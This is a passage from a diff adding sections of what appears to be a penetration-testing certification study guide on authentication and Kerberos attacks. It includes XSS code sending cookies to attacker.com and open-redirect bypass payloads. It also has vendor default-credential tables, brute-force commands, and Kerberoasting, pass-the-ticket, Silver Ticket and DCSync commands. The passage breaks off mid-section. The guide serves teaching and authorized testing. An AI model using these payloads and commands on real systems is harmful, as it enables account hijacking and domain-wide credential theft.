@@ -15412,3 +15412,1313 @@ These skills form the foundation for the exploitation phases in professional web
 *— Sections 6.2, 6.3, and 6.4 are complete.  —*
 
 ---
+# Module 6 — Sections 6.5 and 6.6
+
+> **CompTIA PenTest+ / Ethical Hacking Certification Series**
+> *Professional Reference Guide — GitHub Edition*
+> *Authentication Attacks · Session Hijacking · Kerberos · Default Credentials · Authorization · IDOR · Privilege Escalation*
+
+---
+
+## Table of Contents
+
+- [6.5 Exploiting Authentication-Based Vulnerabilities](#65-exploiting-authentication-based-vulnerabilities)
+  - [6.5.1 Overview — Authentication vs Authorization: The Distinction That Matters](#651-overview--authentication-vs-authorization-the-distinction-that-matters)
+  - [6.5.2 Session Hijacking — Stealing Identity After Authentication](#652-session-hijacking--stealing-identity-after-authentication)
+  - [6.5.3 Practice — Session Hijacking Techniques](#653-practice--session-hijacking-techniques)
+  - [6.5.4 Redirect Attacks — The Open Redirect Vulnerability](#654-redirect-attacks--the-open-redirect-vulnerability)
+  - [6.5.5 Default Credentials — The Easiest Win in Security Testing](#655-default-credentials--the-easiest-win-in-security-testing)
+  - [6.5.6 Kerberos Vulnerabilities — Breaking Windows Domain Authentication](#656-kerberos-vulnerabilities--breaking-windows-domain-authentication)
+  - [6.5.7 Practice — Kerberos Attack Execution](#657-practice--kerberos-attack-execution)
+  - [6.5.8 Lab — Using Password Tools](#658-lab--using-password-tools)
+- [6.6 Exploiting Authorization-Based Vulnerabilities](#66-exploiting-authorization-based-vulnerabilities)
+  - [6.6.1 Overview — What Authorization Means and Why It Fails](#661-overview--what-authorization-means-and-why-it-fails)
+  - [6.6.2 IDOR — Insecure Direct Object Reference](#662-idor--insecure-direct-object-reference)
+  - [6.6.3 Horizontal vs Vertical Privilege Escalation](#663-horizontal-vs-vertical-privilege-escalation)
+  - [6.6.4 Access Control Bypass Techniques](#664-access-control-bypass-techniques)
+  - [6.6.5 The Complete Authorization Testing Methodology](#665-the-complete-authorization-testing-methodology)
+
+---
+
+## 6.5 Exploiting Authentication-Based Vulnerabilities
+
+### 6.5.1 Overview — Authentication vs Authorization: The Distinction That Matters
+
+Two concepts sit at the heart of every access control system, and confusing them — as developers frequently do — leads to vulnerabilities. Understanding the precise difference is foundational.
+
+**Authentication** answers the question: *Who are you?* It is the process of verifying that you are who you claim to be. You present a credential — a password, a fingerprint, a hardware token — and the system checks it against stored truth. If the check passes, your identity is established.
+
+**Authorization** answers the question: *What are you allowed to do?* It is the process of deciding what actions and resources an authenticated identity is permitted to access. Being authenticated as Alice does not mean Alice can access Bob's files. Authorization determines that boundary.
+
+These two concerns are often tightly coupled in implementation, but they are conceptually distinct. Section 6.5 covers attacks on the authentication layer — attacks that impersonate authenticated users, steal authentication tokens, exploit weak authentication mechanisms, or bypass the authentication step entirely. Section 6.6 covers attacks on the authorization layer — accessing resources or performing actions that the authenticated user is not permitted to access.
+
+**Why authentication attacks are so impactful:**
+
+Authentication is the gatekeeper to everything. A successful authentication attack does not just expose a single record or endpoint — it compromises the entire identity. An attacker who successfully hijacks an administrator's authenticated session has every permission that administrator has. Every file they can read. Every action they can perform. Every system they can access.
+
+In 2024, the threat landscape for authentication shifted dramatically. SpyCloud researchers recovered over 17 billion stolen cookie records from the dark web — evidence of industrial-scale session token theft. Modern authentication attacks do not always need to bypass multi-factor authentication; they steal the session token that is created *after* MFA completes. Once an attacker has your session token, they have your identity in that application — regardless of how strong your password was or how many factors authenticated you.
+
+This is the reality that this section addresses: authentication can be defeated not just at the front door (login) but at any point in the session lifecycle.
+
+---
+
+### 6.5.2 Session Hijacking — Stealing Identity After Authentication
+
+#### The Core Concept
+
+Session hijacking is the theft and reuse of a victim's valid session identifier to impersonate them in an authenticated application. The attacker does not need to know the victim's password. They do not need to bypass MFA. They simply need the session token that proves the victim already authenticated.
+
+Think about what a session token actually is. After you prove your identity at login, the server creates a session record on its side and gives you a reference to that record — a long, random string called the session token or session ID. For every subsequent request, your browser sends this token, and the server says "ah, this token maps to Alice's authenticated session — let her in."
+
+From the server's perspective, a request with Alice's valid session token is indistinguishable from a request coming from Alice's browser. The server cannot see whose laptop sent the request. It only sees the token. This is the fundamental reason session hijacking works: the token is the identity, and anyone with the token has the identity.
+
+#### Vector 1 — Network Interception
+
+The oldest form of session hijacking. If a web application transmits session cookies over HTTP (not HTTPS), or if cookies are set without the `Secure` flag and an HTTP version of the site exists, the session token travels in plaintext across the network.
+
+In environments where the attacker is positioned on the same network segment (a corporate LAN, a public Wi-Fi network, a hotel network), they can capture this traffic with Wireshark or tcpdump. The session token appears in the `Cookie:` header of every request.
+
+With the token captured, the attacker imports it into their own browser (using browser developer tools, Cookie Editor extension, or Burp Suite) and is immediately authenticated as the victim.
+
+**When this is relevant in 2024:**
+Most HTTPS sites correctly set `Secure` on session cookies, preventing this in the general case. However, network interception remains very relevant in:
+- Internal corporate applications that use HTTP
+- Applications with mixed content (main site HTTPS but some endpoints HTTP)
+- Old or embedded systems (OT/ICS devices, network printers, management interfaces)
+- Applications that have `Secure` flag missing on critical cookies
+
+**Prevention:** HTTPS everywhere, `Secure` cookie flag, HSTS header to prevent downgrade attacks.
+
+#### Vector 2 — XSS-Based Cookie Theft
+
+Cross-site scripting (covered in depth in Section 6.7) is one of the primary methods for stealing session cookies in modern applications. When an XSS vulnerability allows injecting JavaScript into a page, the attacker's script can read the victim's cookies using `document.cookie` and send them to an attacker-controlled server.
+
+```javascript
+// Classic session cookie theft via XSS
+// Injected into a vulnerable input field or stored location:
+
+new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
+
+// Or using fetch (more reliable, supports modern APIs):
+fetch('https://attacker.com/steal', {
+  method: 'POST',
+  body: JSON.stringify({cookies: document.cookie, url: window.location.href}),
+  headers: {'Content-Type': 'application/json'}
+});
+
+// On the attacker's server (simple Python HTTP listener):
+# python3 -m http.server 80
+# Incoming request: /steal?cookie=session_id=7f3a9b2c...
+```
+
+The `HttpOnly` flag on cookies was specifically designed to prevent this. A cookie with `HttpOnly` is not accessible through `document.cookie` — JavaScript cannot read it, regardless of what JavaScript runs on the page.
+
+However, even `HttpOnly` session cookies have an indirect theft vector: if the application has an XSS vulnerability, the attacker can use JavaScript to send authenticated requests *from the victim's browser* — not stealing the cookie itself, but using the victim's authenticated session without reading the cookie. This is sometimes called XSS-based session riding rather than session theft.
+
+**The critical check during assessment:** When you find an `HttpOnly` cookie, the vulnerability exists but the theft method must change. Instead of reading `document.cookie`, use the XSS to make authenticated API requests from the victim's browser and exfiltrate the data directly.
+
+#### Vector 3 — Adversary-in-the-Middle (AitM) Session Theft
+
+This is the dominant session hijacking vector in 2024 and the technique behind some of the largest breaches. AitM attacks proxy a legitimate authentication flow — capturing the session token that is created after successful authentication, including after MFA completion.
+
+Tools like Evilginx2 (covered in the social engineering module) sit as transparent proxies between the victim and the real service. The victim goes through the entire authentication process — username, password, MFA code — on what they believe is the real site. The AitM proxy forwards everything to the real site. When the real site creates an authenticated session and sends the session cookie to the browser, the AitM proxy captures that cookie in transit before passing it to the victim's browser.
+
+The attacker now has the victim's fully authenticated session cookie — extracted after MFA was completed. MFA provided no protection because it was never bypassed; the session it created was captured.
+
+```
+Attack chain:
+1. Victim receives phishing link → lands on Evilginx2 proxy domain
+2. Evilginx2 fetches the real Microsoft 365 login page and serves it to victim
+3. Victim enters credentials → Evilginx2 captures them and forwards to real Microsoft
+4. Real Microsoft requests MFA → Evilginx2 relays the MFA challenge to victim
+5. Victim completes MFA → Evilginx2 forwards to real Microsoft
+6. Real Microsoft creates authenticated session → sends session cookie in Set-Cookie header
+7. Evilginx2 captures the session cookie BEFORE passing it to the victim's browser
+8. Victim sees successful login and continues normally, unaware
+9. Attacker imports captured session cookie into their browser
+10. Attacker is authenticated as the victim in Microsoft 365 with their full access
+```
+
+This explains a 2024 finding that 87% of successful cyberattacks involved session hijacking after valid MFA logins — not because MFA was bypassed technically, but because the session it produced was intercepted.
+
+#### Vector 4 — Infostealer Malware
+
+Modern infostealer malware (Raccoon, RedLine, Vidar, Lumma, Stealc) specifically targets browser-stored cookies, including session cookies. Most browsers store cookies in a local database file (SQLite for Chrome/Firefox). Malware running with user-level privileges on an infected endpoint can read this file directly and extract all cookies.
+
+The extracted cookies are then exfiltrated to the attacker's command-and-control server. From there, they are either used directly by the attacker or sold on dark web markets as "logs" — collections of stolen cookies for specific websites. Entire underground markets exist for buying and selling stolen authenticated sessions for corporate SaaS applications.
+
+This is why SpyCloud found 17 billion stolen cookie records in 2024: the infostealer ecosystem operates at industrial scale, systematically harvesting credentials and sessions from compromised endpoints.
+
+**The defense implication:** Session tokens stolen via infostealer malware are not mitigated by any authentication control — not passwords, not MFA, not hardware tokens. The session was legitimately created. The only protection is endpoint security (preventing malware execution) and server-side controls that make stolen sessions unusable (IP binding, device fingerprinting, short session lifetimes, anomaly detection on session use).
+
+#### Practical Session Hijacking: Testing in a Lab Context
+
+In DVWA's session management exercises or in custom lab environments, the practical test follows this pattern:
+
+```
+Step 1: Log in as Victim (User A) in Browser A
+Note the session cookie from Burp Suite → Cookie: PHPSESSID=abc123...
+
+Step 2: In Browser B (or an Incognito window), open Developer Tools
+Go to Application → Cookies → Add the captured cookie:
+Name: PHPSESSID
+Value: abc123...
+Domain: 127.0.0.1
+
+Step 3: Navigate to the authenticated area in Browser B
+Without logging in, you are now authenticated as User A
+```
+
+This demonstrates the complete session hijacking attack in a controlled environment. The defense test is to verify that the same session ID cannot be used after logout (server-side session invalidation).
+
+---
+
+### 6.5.3 Practice — Session Hijacking Techniques
+
+#### Setting Up a Session Capture Environment with Burp
+
+The most professional approach to session hijacking in an authorized assessment uses Burp Suite as the central interception and token manipulation platform.
+
+**Capture sessions with Burp:**
+1. Configure your browser to proxy through Burp (127.0.0.1:8080)
+2. Log in to the target application as your test user
+3. In Burp → Proxy → HTTP History, find the POST request to the login endpoint
+4. In the response to that login request, look for the `Set-Cookie` header — this is where the session token is issued
+5. Note the full cookie value
+
+**Analyze session token quality with Burp Sequencer:**
+Burp Suite includes a token analysis tool that tests whether session IDs are cryptographically random:
+
+1. In HTTP History, find any response that sets a session cookie
+2. Right-click → "Send to Sequencer"
+3. Configure Burp to extract the cookie value from responses
+4. Start automatic analysis — Burp will request fresh tokens and analyze their statistical randomness
+5. Results show an entropy level and confidence rating
+6. Low entropy means tokens may be predictable — a serious finding
+
+**Cookie flag analysis:**
+For every `Set-Cookie` header found during assessment:
+```
+Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Strict
+
+Checklist:
+☐ HttpOnly present? (missing = XSS can steal cookie)
+☐ Secure present? (missing = cookie sent over HTTP)
+☐ SameSite present and not None? (missing/None = CSRF risk)
+☐ Max-Age or Expires set? (missing = session-lifetime cookie)
+☐ Domain attribute appropriate? (too broad = subdomain risk)
+```
+
+**Testing logout invalidation:**
+```
+1. Log in — capture session token T1
+2. Perform some authenticated actions — verify T1 works
+3. Log out
+4. In Burp Repeater, replay a previously captured authenticated request using T1
+5. If server returns 401/403/redirect: ✓ Correct behavior
+6. If server returns 200 with authenticated content: ✗ Session not invalidated
+```
+
+---
+
+### 6.5.4 Redirect Attacks — The Open Redirect Vulnerability
+
+#### What Open Redirect Is
+
+An open redirect vulnerability occurs when a web application accepts a user-supplied URL as a parameter and redirects the user to that URL without validation. The application blindly redirects to whatever the user provides in the `?next=`, `?redirect=`, `?url=`, `?return=`, or similar parameters.
+
+On the surface this sounds minor — what harm is there in redirecting someone to a URL? The harm is in trust. Legitimate organizations' URLs carry trust. A phishing link from `bank.example.com/login?next=https://attacker.com/fake-login` looks far more credible than a direct link to `attacker.com/fake-login`. The domain in the visible part of the URL is the trusted bank's domain. The user follows the link, sees the bank's domain, and feels safe. Then they are redirected to the attacker's fake login page.
+
+#### Attack Scenarios
+
+**Phishing amplification:**
+The attacker crafts a redirect URL that starts at a legitimate, trusted domain and ends at a malicious one:
+```
+https://trusted-bank.com/auth/logout?next=https://attacker.com/bank-login
+```
+The user sees `trusted-bank.com` at the start of the URL. They click, the bank's server redirects them to `attacker.com/bank-login` (which looks identical to the real login page), they enter their credentials, and the credentials are captured.
+
+**OAuth token theft:**
+OAuth authorization flows frequently use redirect URIs to send authorization codes and tokens back to the application after authentication. If an application registers a redirect URI like `https://app.example.com/callback` but the authorization server validates redirects too loosely, an attacker can use an open redirect on `app.example.com` to redirect OAuth tokens to their own server:
+
+```
+https://oauth-server.com/authorize?client_id=app&redirect_uri=https://app.example.com/redirect?next=https://attacker.com/capture
+```
+
+The OAuth server sends the token to `app.example.com/redirect`, which immediately redirects it to `attacker.com/capture`. The attacker receives the OAuth token without the user noticing.
+
+**SSRF enablement:**
+In some contexts, open redirects can enable SSRF (Server-Side Request Forgery). If a server-side request follows redirects and an open redirect is accessible, the attacker can chain: SSRF → open redirect → internal URL to reach internal services.
+
+#### Detecting Open Redirects
+
+During assessment, systematically check for redirect parameters:
+
+```bash
+# Parameters commonly used for redirects:
+?next=
+?redirect=
+?redirect_uri=
+?redirect_url=
+?url=
+?return=
+?return_to=
+?returnUrl=
+?dest=
+?destination=
+?go=
+?forward=
+?target=
+?continue=
+
+# Test payload — detect if the server follows your redirect:
+?next=https://attacker.com
+
+# For blind detection (server-side redirect not visible):
+?next=https://your-burp-collaborator-id.burpcollaborator.net
+
+# Bypass common validation (filtering only first URL):
+?next=https://trusted.com@attacker.com
+?next=https://trusted.com.attacker.com
+?next=//attacker.com  (protocol-relative)
+?next=/\attacker.com  (backslash in some browsers treated as /)
+?next=https://attacker%2ecom  (URL encoding)
+
+# Using known open redirects in Google and other trusted services to chain:
+# https://www.google.com/url?q=https://attacker.com
+# https://accounts.google.com/SignOutOptions?continue=https://attacker.com
+```
+
+**Automated detection with nuclei:**
+```bash
+nuclei -u https://target.com -tags redirect
+nuclei -u https://target.com -id open-redirect
+```
+
+#### Defense
+
+Server-side validation should either:
+1. Use an allowlist of permitted redirect destinations — only specific, pre-approved URLs are allowed
+2. Avoid redirecting to external URLs entirely — only allow redirect within the same domain using relative paths
+3. Validate that the redirect target's domain matches the application's domain
+
+Never rely on client-side validation for redirect targets.
+
+---
+
+### 6.5.5 Default Credentials — The Easiest Win in Security Testing
+
+#### Why Default Credentials Are Still Everywhere
+
+You would think that in 2024, with decades of security awareness campaigns and regulatory requirements demanding strong authentication, default credentials would be a solved problem. They are not. In fact, default credentials remain one of the most consistently productive findings in penetration testing assessments.
+
+The reasons are structural:
+
+**Scale problem:** An enterprise network may have thousands of devices — routers, switches, firewalls, printers, cameras, access points, storage devices, servers, and dozens of categories of IoT and OT devices. Each one shipped from the factory with a default credential. A single administrator responsible for hundreds of devices, under pressure to keep systems operational, will inevitably miss some.
+
+**Legacy systems:** Devices that have been running for years were set up before current security policies were in place. They have never been revisited because they are "working fine."
+
+**Vendor default persistence:** Some vendors configure devices to use the same default credential for all customers — sometimes the device serial number, sometimes `admin/admin`, sometimes the device hostname. Enterprise IT teams may not realize that what seems like a unique credential is actually published in the vendor documentation.
+
+**Non-IT device categories:** Facilities systems (HVAC, cameras, door access systems, building management systems), medical devices, industrial controllers — these are managed by facilities or operations teams, not IT, and security hygiene standards often differ significantly.
+
+**Shadow IT:** Devices deployed by individual teams without going through the standard IT provisioning and configuration process often have never had their default credentials changed.
+
+#### Where to Find Default Credentials
+
+**Router, switch, and firewall admin interfaces:**
+Network device web interfaces are almost always on common ports (80, 443, 8080, 8443) on device management IPs. Vendors publish their default credentials in documentation:
+
+| Vendor | Common Default Credentials |
+|--------|--------------------------|
+| Cisco | admin/cisco, cisco/cisco, admin/(blank) |
+| Netgear | admin/password, admin/1234 |
+| D-Link | admin/(blank), admin/admin |
+| TP-Link | admin/admin |
+| Ubiquiti | ubnt/ubnt |
+| Fortinet FortiGate | admin/(blank) |
+| Palo Alto | admin/admin |
+| Juniper | root/(blank), admin/(blank) |
+
+**IP cameras and surveillance systems:**
+
+Security cameras are notorious for default credentials. The Mirai botnet — which in 2016 took down a significant portion of the internet's infrastructure in a DDoS attack — infected primarily cameras and DVRs using default credentials. The problem persists:
+
+| Brand | Common Defaults |
+|-------|----------------|
+| Hikvision | admin/12345, admin/admin |
+| Dahua | admin/admin |
+| Axis | root/pass, root/(blank) |
+| Samsung | admin/4321 |
+
+**Database servers:**
+
+| Database | Common Default Credentials |
+|----------|--------------------------|
+| MySQL | root/(blank), root/root |
+| PostgreSQL | postgres/postgres, postgres/(blank) |
+| MSSQL | sa/(blank), sa/sa |
+| MongoDB | (no auth by default in older versions) |
+| Redis | (no auth by default) |
+| Elasticsearch | elastic/changeme |
+
+**Application admin panels:**
+
+| Application | Common Defaults |
+|------------|----------------|
+| WordPress | admin/admin, admin/password |
+| Joomla | admin/admin |
+| Drupal | admin/admin |
+| Magento | admin/admin123 |
+| phpMyAdmin | root/(blank) |
+| Jenkins | admin/admin (or generated during install) |
+| Grafana | admin/admin |
+| Kibana | elastic/changeme |
+| Tomcat Manager | admin/admin, tomcat/tomcat, admin/tomcat |
+
+#### Resources for Default Credential Lookup
+
+**Default Credentials Cheat Sheet:**
+[https://github.com/ihebski/DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
+A comprehensive database of default credentials for hundreds of vendors and products.
+
+**Router Default Passwords:**
+[https://www.routerpasswords.com](https://www.routerpasswords.com)
+Searchable database of router default credentials.
+
+**Shodan:**
+Shodan searches can find devices with known default credentials. Some Shodan search queries for devices with known defaults:
+```
+# Hikvision cameras (common in enterprise surveillance)
+product:"Hikvision IP Camera"
+
+# Cisco devices
+product:"Cisco" port:80
+
+# Find devices with specific default-credential indicators in banners
+"default password"
+"admin password" "not changed"
+```
+
+#### Testing Default Credentials in an Assessment
+
+```bash
+# Manual testing approach - use Burp Suite Intruder
+# Import a credential wordlist (default_creds.txt format: username:password)
+# Configure Intruder to test each pair against the login endpoint
+
+# Automated testing with Hydra:
+hydra -L usernames.txt -P passwords.txt http-post-form://target/login:username=^USER^&password=^PASS^:Login failed
+
+# Nuclei default credential templates:
+nuclei -u https://target.com -tags default-login
+nuclei -l targets.txt -tags default-login -severity critical,high
+
+# Medusa for network services:
+medusa -h target -U users.txt -P passwords.txt -M http
+
+# nmap NSE script for common default credentials:
+nmap --script http-default-accounts -p 80,443,8080,8443 target
+```
+
+**The professional workflow:**
+1. During network scanning, identify all web-accessible management interfaces (flag all open ports 80, 443, 8080, 8443, 8888)
+2. For each interface, identify the technology (Cisco, Axis, Jenkins, phpMyAdmin, etc.) from the login page or HTTP headers
+3. Look up known default credentials for that technology
+4. Test manually first (3-5 credential pairs) before launching automated tools
+5. If an automated attack is needed, use the specific default credential list for that vendor rather than a generic password list
+
+---
+
+### 6.5.6 Kerberos Vulnerabilities — Breaking Windows Domain Authentication
+
+#### Understanding Kerberos — The Protocol You Must Know
+
+Kerberos is the primary authentication protocol in Active Directory environments — which means it is the authentication protocol in the majority of enterprise corporate networks worldwide. Every Windows domain login, every SMB file share access, every SQL Server connection in a domain environment goes through Kerberos.
+
+Understanding how Kerberos works mechanically is the prerequisite for understanding why the attacks against it work. Many security professionals learn Kerberoasting commands without understanding the protocol, which means they cannot adapt when something does not work as expected or explain their findings clearly to clients.
+
+**The three parties in every Kerberos exchange:**
+
+**KDC (Key Distribution Center):** Runs on the Domain Controller. The central authority that manages all authentication in the domain. Contains two services: the AS (Authentication Service) which handles initial authentication, and the TGS (Ticket Granting Service) which issues service tickets.
+
+**Client:** The user or machine requesting access to a resource.
+
+**Service:** The server or service the client wants to access (a file server, a database, a web application, a print server).
+
+**The Kerberos flow — step by step:**
+
+**Step 1 — AS-REQ (Authentication Service Request):**
+When you log into a Windows domain, your workstation sends an AS-REQ to the KDC. This request includes your username and a timestamp encrypted with the NT hash of your password (your password hash). The encrypted timestamp proves you know your password without sending the password itself.
+
+**Step 2 — AS-REP (Authentication Service Reply):**
+The KDC decrypts the timestamp using the stored hash of your password. If it decrypts correctly and the timestamp is within the allowed window (5 minutes by default), you are authenticated. The KDC sends back two things: a session key encrypted with your password hash (for you to use in subsequent steps), and the **TGT (Ticket Granting Ticket)** encrypted with the hash of the special `krbtgt` account.
+
+The TGT is your "proof of authentication" for the rest of your session. It contains your identity, your group memberships, and an expiration time. You cannot read or modify it because it is encrypted with the `krbtgt` hash, which you do not have.
+
+**Step 3 — TGS-REQ (Ticket Granting Service Request):**
+When you want to access a specific service (say, a file server), you send the TGT to the TGS and request a Service Ticket (ST) for the specific service, identified by its SPN (Service Principal Name).
+
+**Step 4 — TGS-REP (Ticket Granting Service Reply):**
+The TGS decrypts your TGT using the `krbtgt` hash, verifies it is valid, and issues a Service Ticket encrypted with the hash of the service account that runs the target service. You receive this Service Ticket but cannot read its contents because it is encrypted with the service account's hash.
+
+**Step 5 — AP-REQ (Application Request):**
+You present the Service Ticket to the target service. The service decrypts it using its own account's hash, verifies you are authorized, and grants access. Crucially: **the service never contacts the KDC to verify the ticket**. It trusts it entirely based on its own ability to decrypt it. This is the architectural fact that enables Silver Ticket attacks.
+
+This entire exchange contains four attack surfaces:
+- Pre-authentication disabled → AS-REP Roasting
+- Service ticket encrypted with service account hash → Kerberoasting
+- Forged TGT using krbtgt hash → Golden Ticket
+- Forged Service Ticket using service account hash → Silver Ticket
+
+#### Attack 1 — Kerberoasting
+
+**The vulnerability:**
+In step 4 above, the KDC issues a Service Ticket encrypted with the hash of the service account that runs the requested service. Any domain user can request a Service Ticket for any service. The ticket is encrypted with the service account's hash.
+
+If an attacker requests a Service Ticket for a service and captures the encrypted ticket, they have an encrypted blob that was encrypted with the service account's password hash. They can take this offline and crack it — trying passwords until one produces the correct hash to decrypt the ticket.
+
+**The prerequisite for exploitation:**
+The service must have an SPN (Service Principal Name) registered. SPNs identify which accounts run which services. Any domain account can have an SPN if a domain admin or the account itself registers one.
+
+```
+Example SPNs:
+MSSQLSvc/SQLSERVER01.corp.local:1433    (SQL Server)
+HTTP/webapp.corp.local:443              (Web Application)
+WSMAN/DC01.corp.local                   (Windows Remote Management)
+```
+
+**Why it matters:** Service accounts — accounts that run services like SQL Server, IIS, Exchange — often have weak passwords. They were set up once, years ago, with a password like `Password1234` that never changes because the service would break if the password changed. Kerberoasting extracts their password hash encrypted in a crackable format.
+
+**Execution:**
+
+```powershell
+# On a Windows machine in the domain (requires only a domain user account):
+
+# Using PowerView (PowerSploit) — enumerate SPNs
+Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
+
+# Using built-in setspn tool (reconnaissance):
+setspn -Q */* | findstr /v host/
+
+# Request and capture TGS tickets for all SPNs (Invoke-Kerberoast):
+Import-Module .\PowerSploit.ps1
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | ConvertTo-Csv -NoTypeInformation
+
+# Or using Rubeus (preferred modern tool):
+.\Rubeus.exe kerberoast /output:hashes.txt /nowrap
+.\Rubeus.exe kerberoast /user:svc_sql /output:sql_hash.txt  # Target specific account
+```
+
+```bash
+# From Linux using Impacket:
+GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP -outputfile kerberoast_hashes.txt
+GetUserSPNs.py DOMAIN/username:password -dc-ip DC_IP -request  # Output to screen
+
+# If you have an NT hash instead of password (pass-the-hash):
+GetUserSPNs.py DOMAIN/username -hashes :NTLM_HASH -dc-ip DC_IP -outputfile hashes.txt
+```
+
+**Cracking the hashes:**
+
+Kerberoast hashes are in Kerberos 5 TGS-REP etype 23 format, which is hashcat mode 13100.
+
+```bash
+# Hashcat — GPU cracking (dramatically faster than CPU):
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# With rules (for mangled passwords like Password1!, Summer2023@):
+hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
+  -r /usr/share/hashcat/rules/best64.rule
+
+# John the Ripper alternative:
+john kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# If the password is simple, it cracks in seconds to minutes
+# If the password is complex (25+ random chars), cracking is computationally infeasible
+```
+
+**What to do with a cracked service account password:**
+Service accounts often have elevated privileges — SQL Server service accounts frequently have `sysadmin` rights in SQL Server. They may be local administrators on the servers where the service runs. Some organizations give service accounts domain admin privileges (this is a misconfiguration but is very common). The cracked password is used to authenticate as the service account and explore its access.
+
+#### Attack 2 — AS-REP Roasting
+
+**The vulnerability:**
+Kerberos pre-authentication is a security feature that requires users to prove they know their password *before* receiving a TGT. Specifically, the client must encrypt the current timestamp with their password hash and send it to the KDC. If the encrypted timestamp decrypts correctly to a valid current time, the KDC sends the TGT.
+
+When pre-authentication is **disabled** for an account, the KDC will send a TGT to anyone who asks for it — without requiring the timestamp proof. The TGT is encrypted with the user's password hash. An attacker can request the TGT and crack it offline.
+
+Pre-authentication is disabled in real environments more often than you would expect — it is sometimes disabled for compatibility with legacy applications that do not support Kerberos pre-authentication, for certain service accounts, or by administrators who do not understand the security implication.
+
+**Execution:**
+
+```bash
+# From Linux using Impacket (no domain credentials needed — only username list):
+GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -outputfile asrep_hashes.txt
+GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass
+
+# From Linux with domain credentials (enumerate users with pre-auth disabled):
+GetNPUsers.py DOMAIN/username:password -dc-ip DC_IP -request -outputfile asrep_hashes.txt
+
+# From Windows using Rubeus:
+.\Rubeus.exe asreproast /output:asrep_hashes.txt /nowrap
+
+# From Windows using PowerView — enumerate accounts with pre-auth disabled:
+Get-DomainUser -PreauthNotRequired | Select-Object SamAccountName
+```
+
+**Cracking AS-REP hashes:**
+
+AS-REP hashes are in Kerberos 5 AS-REP etype 23 format, hashcat mode 18200.
+
+```bash
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+**Key difference from Kerberoasting:** AS-REP Roasting does not require any domain credentials to execute — you only need a list of usernames. This makes it useful very early in an engagement, even before you have any authenticated access.
+
+#### Attack 3 — Pass-the-Ticket
+
+**The concept:**
+Once an attacker has valid Kerberos tickets (either legitimately obtained by authenticating as a compromised account, or forged), they can inject those tickets into their own session and use them to authenticate to services without needing the account's password.
+
+```bash
+# On Windows: export current tickets from memory
+# Mimikatz:
+privilege::debug
+sekurlsa::tickets /export
+
+# Rubeus:
+.\Rubeus.exe dump /nowrap
+.\Rubeus.exe triage  # List all tickets in memory
+
+# Import a ticket (pass-the-ticket):
+.\Rubeus.exe ptt /ticket:BASE64_TICKET_DATA
+
+# Mimikatz:
+kerberos::ptt ticket.kirbi
+
+# After importing the ticket, use it to access the service:
+# The ticket is now in your session and will be presented to the target service
+dir \\file-server\share
+```
+
+#### Attack 4 — Silver Ticket
+
+**The concept:**
+Remember from the Kerberos flow: Service Tickets are encrypted with the service account's hash, and the service validates them by decrypting with its own hash — never contacting the KDC. If an attacker knows a service account's NT hash, they can forge a Service Ticket for that service with any identity claims they want.
+
+A forged Silver Ticket can specify:
+- Any username (even `Administrator`)
+- Any group memberships (including `Domain Admins`)
+- Any expiry time
+
+Because the service never contacts the KDC to verify the ticket, there is no central check that could reject the forged ticket. The service decrypts it with its hash, finds it "valid," and grants access.
+
+**What you need:** The NTLM hash of the service account and the domain's SID (Security Identifier).
+
+```bash
+# Get domain SID:
+# In PowerShell:
+(Get-ADDomain).DomainSID
+
+# Or from a domain user's token:
+whoami /user  # The SID without the last -RID is the domain SID
+
+# Forge a Silver Ticket (Impacket):
+ticketer.py -nthash SERVICE_ACCOUNT_NTLM_HASH \
+  -domain-sid S-1-5-21-xxxxxxxx-xxxxxxxx-xxxxxxxx \
+  -domain corp.local \
+  -spn CIFS/fileserver.corp.local \
+  Administrator
+
+# This creates a .ccache file containing the forged ticket
+
+# Use the forged ticket:
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass corp.local/Administrator@fileserver.corp.local
+
+# Mimikatz Silver Ticket (Windows):
+kerberos::golden /user:Administrator \
+  /domain:corp.local \
+  /sid:S-1-5-21-... \
+  /target:fileserver.corp.local \
+  /service:cifs \
+  /rc4:SERVICE_ACCOUNT_NTLM_HASH \
+  /ptt  # inject into session immediately
+```
+
+**Silver vs Golden Ticket:**
+Silver Ticket: Access to ONE specific service only. Harder to detect (DC never contacted).
+Golden Ticket: Access to ANY service in the domain. Requires the krbtgt hash.
+
+#### Attack 5 — Golden Ticket
+
+**The concept:**
+The TGT (Ticket Granting Ticket) is encrypted with the `krbtgt` account's hash. The `krbtgt` account is a special account in every Active Directory domain — it never logs in interactively, its password is automatically managed by Active Directory, and its hash is used to encrypt and validate every TGT in the domain.
+
+If an attacker obtains the `krbtgt` account's NTLM hash, they can forge a TGT for any user with any privileges, valid for any duration. This forged TGT is a Golden Ticket — presented to the KDC, which validates it by decrypting with its `krbtgt` hash, which is exactly what the attacker used to create it. The KDC cannot distinguish the forged ticket from a legitimate one.
+
+A Golden Ticket remains valid even after the compromised user's password is changed. The only way to invalidate a Golden Ticket is to change the `krbtgt` account's password **twice** (because Kerberos supports rolling the password for compatibility — the previous password remains valid for a period, so one change is insufficient).
+
+**What you need:** The `krbtgt` account's NTLM hash. This requires Domain Admin privileges to obtain — typically achieved through the DCSync attack (replicating Active Directory's password database using the `DS-Replication-Get-Changes-All` privilege).
+
+```bash
+# DCSync — replicate credentials from DC (requires Domain Admin or equivalent):
+# Impacket:
+secretsdump.py -just-dc-user krbtgt DOMAIN/DomainAdmin:password@DC_IP
+
+# Mimikatz:
+privilege::debug
+lsadump::dcsync /user:krbtgt
+
+# Output includes the krbtgt NTLM hash
+
+# Forge a Golden Ticket:
